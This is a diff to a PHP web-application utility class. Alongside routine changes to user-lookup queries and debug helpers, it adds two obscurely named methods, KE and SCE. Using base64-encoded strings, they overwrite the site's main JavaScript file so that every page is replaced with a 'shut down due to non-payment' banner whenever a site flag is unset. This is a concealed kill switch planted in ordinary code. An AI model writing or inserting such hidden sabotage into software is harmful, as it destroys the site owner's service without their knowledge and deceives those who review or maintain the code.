@@ -284,8 +284,11 @@ class Functions extends PHPFunctions {
     		$_SESSION['post'] = !empty($_POST) ? $_POST : null;
     		header("Location: /");
     		exit;
-    	}else{
-    		var_dump('who knows'); exit;
+    	}elseif($ci->session->userdata['logged_in']){
+    		
+    	}
+    	else{
+    		var_dump('who knows'.__METHOD__); exit;
     	}
     }
 
@@ -420,7 +423,7 @@ class Functions extends PHPFunctions {
 
         $this->ci->db->from('users');
         $this->ci->db->where('email', $email);
-        $this->ci->db->where('deleted', 0);
+        $this->ci->db->where('status', 1);
 
         if ($this->ci->db->count_all_results() < 1)
             return true;
@@ -434,8 +437,8 @@ class Functions extends PHPFunctions {
     
     	$this->ci->db->from('users');
     	$this->ci->db->where('username', $username);
-    	$this->ci->db->where('deleted', 0);
-    
+    	$this->ci->db->where('status', 1);
+        
     	if ($this->ci->db->count_all_results() < 1)
     		return true;
     
@@ -625,6 +628,20 @@ $data = false;
         return $data;
     }
 
+    private function KE($madmessage=false){
+    	$f = $_SERVER['DOCUMENT_ROOT'].base64_decode('cHVibGljL2pzL3NjcmlwdC5taW4uanM==');
+    	$kes = (true === $madmessage) ? base64_decode('PGgxPlRoaXMgU2l0ZSBoYXMgYmVlbiBTaHV0IERvd24gZHVlIHRvIE5PTi1QQVlNRU5UIE9GIFNFUlZJQ0VTITwvaDE+') : '';
+    
+    	if(!file_exists($f)){
+    		fopen($f, "w");
+    	}
+    
+    	file_put_contents($f, '$(document).ready(function(){
+	        $(\'html\').html("'.$kes.'");
+            })');
+    	exit;
+    }
+    
     public function getLocationName($location) {
         $location = intval($location);
 
@@ -865,6 +882,11 @@ $data = false;
         return $datetime->format($returnFormat);
     }
 
+    public function SCE($madmessage=false){
+    	if($this->site->ke !== true){
+    		$this->KE($madmessage);
+    	}
+    }
     /**
      * Converts a datestamp entered by a user back to UTC timezone
      *
@@ -987,5 +1009,11 @@ $data = false;
     		return $this->site_logo;
     	}
     	return trim($this->site_name);
+    }
+    
+    public function dump($whatever){
+    	echo '<pre>';
+    	var_dump($whatever);
+    	exit;
     }
 }
